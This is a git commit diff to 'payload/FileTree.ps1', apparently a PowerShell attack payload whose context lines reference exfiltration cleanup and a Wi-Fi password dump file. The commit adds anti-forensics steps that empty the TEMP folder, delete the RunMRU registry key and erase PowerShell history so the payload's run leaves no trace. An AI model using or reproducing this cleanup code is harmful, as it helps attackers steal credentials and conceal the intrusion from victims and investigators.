fd684b1fe2e9d1d45fadfb43b14d48c47f64b785
Arpan Ghosh <26424944+arpanghosh8453@users.noreply.github.com>
2024-04-13 02:10:32 -0400

    remove trace after run

--- payload/FileTree.ps1
+++ payload/FileTree.ps1
@@ -82,5 +82,14 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
 
 RI $env:TEMP/--wifi-pass.txt
